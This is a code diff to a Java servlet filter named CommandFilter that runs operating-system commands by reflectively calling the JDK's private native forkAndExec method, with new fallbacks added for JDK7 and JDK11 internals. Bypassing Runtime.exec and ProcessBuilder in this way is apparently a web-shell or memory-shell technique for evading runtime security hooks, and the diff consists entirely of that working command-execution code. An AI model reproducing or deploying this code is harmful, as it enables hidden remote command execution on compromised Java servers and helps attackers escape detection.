@@ -84,20 +84,30 @@ public class CommandFilter implements Filter {
         int[] std_fds = new int[]{-1, -1, -1};
         byte[] result = toCString(strs[0]);
         try {
-            Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
             Field helperpathField = processClass.getDeclaredField("helperpath");
-            launchMechanismField.setAccessible(true);
             helperpathField.setAccessible(true);
-            Object launchMechanismObject = launchMechanismField.get(processObject);
             byte[] helperpathObject = (byte[]) helperpathField.get(processObject);
-            int ordinal = (Integer) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
+
+            Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
+            launchMechanismField.setAccessible(true);
+            Object launchMechanismObject = launchMechanismField.get(processObject);
+            int mode = 0;
+            try {
+                Field value = launchMechanismObject.getClass().getDeclaredField("value");
+                value.setAccessible(true);
+                mode = (Integer) value.get(launchMechanismObject);
+            } catch (NoSuchFieldException e) {
+                int ordinal = (Integer) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
+                mode = ordinal + 1;
+            }
 
             Method forkMethod = processClass.getDeclaredMethod("forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class,
                     byte[].class, int.class, byte[].class, int[].class, boolean.class);
             forkMethod.setAccessible(true);
-            forkMethod.invoke(processObject, ordinal + 1, helperpathObject, result, argBlock, args.length,
+            forkMethod.invoke(processObject, mode, helperpathObject, result, argBlock, args.length,
                     null, envc[0], null, std_fds, false);
-        } catch (Exception e) {
+        } catch (NoSuchFieldException e) {
+            // JDK7
             Method forkMethod = processClass.getDeclaredMethod("forkAndExec", byte[].class, byte[].class, int.class,
                     byte[].class, int.class, byte[].class, int[].class, boolean.class);
             forkMethod.setAccessible(true);
@@ -105,9 +115,16 @@ public class CommandFilter implements Filter {
                     null, envc[0], null, std_fds, false);
         }
 
-        Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
-        initStreamsMethod.setAccessible(true);
-        initStreamsMethod.invoke(processObject, std_fds);
+        try {
+            Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
+            initStreamsMethod.setAccessible(true);
+            initStreamsMethod.invoke(processObject, std_fds);
+        } catch (NoSuchMethodException e) {
+            // JDK11
+            Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class, boolean.class);
+            initStreamsMethod.setAccessible(true);
+            initStreamsMethod.invoke(processObject, std_fds, false);
+        }
 
         Method getInputStreamMethod = processClass.getMethod("getInputStream");
         getInputStreamMethod.setAccessible(true);
